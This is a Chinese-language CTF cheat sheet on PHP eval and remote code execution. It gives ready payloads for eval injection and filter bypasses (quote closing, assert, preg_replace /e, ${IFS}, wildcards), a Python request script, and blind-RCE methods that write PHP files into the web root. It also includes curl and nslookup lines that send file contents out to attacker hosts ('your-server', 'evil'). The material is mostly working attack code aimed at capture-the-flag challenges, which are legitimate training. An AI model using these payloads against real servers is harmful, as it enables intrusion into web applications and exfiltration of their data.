# eval 与 RCE 技巧大全

## PHP 代码执行函数对比

| 函数 | 回显 | 用法 |
|------|------|------|
| `system($cmd)` | **有**（直接输出到 stdout） | `system("id")` → 直接在页面看到结果 |
| `passthru($cmd)` | **有**（原始二进制输出） | `passthru("cat flag.php")` |
| `exec($cmd, $out)` | **无**（存入 `$out` 数组） | `exec("id", $out); print_r($out)` |
| `shell_exec($cmd)` | **无**（返回字符串） | `echo shell_exec("id")` |
| `` `$cmd` `` | **无**（等价于 shell_exec） | `` echo `id` `` |
| `popen($cmd, 'r')` | **无**（需 fread） | `$h=popen("id","r");echo fread($h,1024)` |
| `eval($code)` | 取决于代码 | `eval("system('id');")` → 有回显 |

## highlight_file 与 eval 输出顺序

这是 CTF 中常见的陷阱：

```php
<?php
highlight_file(__FILE__);
eval($_GET['cmd']);
?>
```

**关键理解**：
- `highlight_file()` 输出源码高亮 → 这是第一步
- `eval()` 中的 `system()` 输出 → 这是第二步
- 两者在**同一个 HTTP 响应**中，命令结果在源码高亮**之后**
- `system()` 的输出是直接写入 stdout 的，**不会被 highlight_file "挡住"**

**搜索 flag 的方法**：
- 在 HTTP 响应的**末尾**查找 flag
- `highlight_file` 的 HTML 输出很长，flag 通常在最末尾
- 使用 `python_execute` 解析响应，只看最后几百字符

```python
import httpx
r = httpx.get(url, params={"cmd": "system('cat flag.php');"})
# flag 在 r.text 的末尾，不在源码高亮部分
print(r.text[-500:])  # 只看最后 500 字符
```

## eval 绕过技巧

### 1. 分号绕过

```php
// 如果 eval 需要分号但输入被过滤
eval($_GET['cmd']);  // 正常用法
// 传入: system('id')  // 不需要加分号，eval 会自动加
// 或传入: system('id');// 
```

### 2. PHP 闭合标签

```php
// 如果 eval 内容被包裹
eval("echo '" . $_GET['cmd'] . "';");
// 传入: ');system('id');//
// 结果: eval("echo '');system('id');//';");
```

### 3. assert() 注入

```php
// assert() 在 PHP 7 前可以执行代码
assert("system('id')");  // PHP < 7.x
// PHP 7+ assert 变成语言结构，不再执行字符串
```

### 4. preg_replace /e 修饰符

```php
// PHP < 7.0 的 preg_replace /e 会执行替换结果
preg_replace('/test/e', 'system("id")', 'test');
// 任意正则 + /e + 可控替换字符串 → RCE
```

## 无回显 RCE 利用

### 方法 1：写文件到 Web 目录
```bash
system("cat flag.php > /var/www/html/x.txt");
# 然后访问 http://target/x.txt
```

### 方法 2：DNS/HTTP 外带
```bash
system("curl http://your-server/$(cat flag.php | base64)");
system("nslookup $(cat flag.php).your-server.com");
```

### 方法 3：写入 PHP 文件再读
```bash
system("echo '<?php echo file_get_contents(\"/flag\"); ?>' > /var/www/html/read.php");
# 然后访问 http://target/read.php
```

### 方法 4：环境变量 + 另一个漏洞
```bash
# 将结果写入 cookie/session
system("export FLAG=$(cat flag.php)");
# 通过 phpinfo() 或 /proc/self/environ 读取
```

## PHP 代码执行链构造

### 从简单到复杂的利用链

1. **直接执行**：`system("id")` → 有回显
2. **无回显写文件**：`system("cat flag.php > /var/www/html/x")`
3. **无回显外带**：`system("curl http://evil/$(cat flag.php)")`
4. **无回显盲注**：`system("if [ $(cat flag.php | head -c1) = N ]; then sleep 3; fi")`

### 常见 CTF eval 场景

| 场景 | 代码模式 | 绕过方法 |
|------|---------|---------|
| 简单 eval | `eval($_GET['cmd'])` | `system('cat flag.php')` |
| eval + 过滤空格 | `eval($cmd)` + 空格被替换 | `system('cat${IFS}flag.php')` |
| eval + 过滤关键字 | `eval($cmd)` + flag 被替换 | `system('cat${IFS}/f*')` |
| eval + highlight_file | `highlight_file + eval` | 看**页面末尾** |
| eval + 长度限制 | `strlen($cmd) > N` | 使用变量/短函数名 |
| assert 注入 | `assert($_GET['cmd'])` | PHP < 7: `system('id')` |
| preg_replace /e | `preg_replace('/./e', ...)` | 替换字符串中注入代码 |
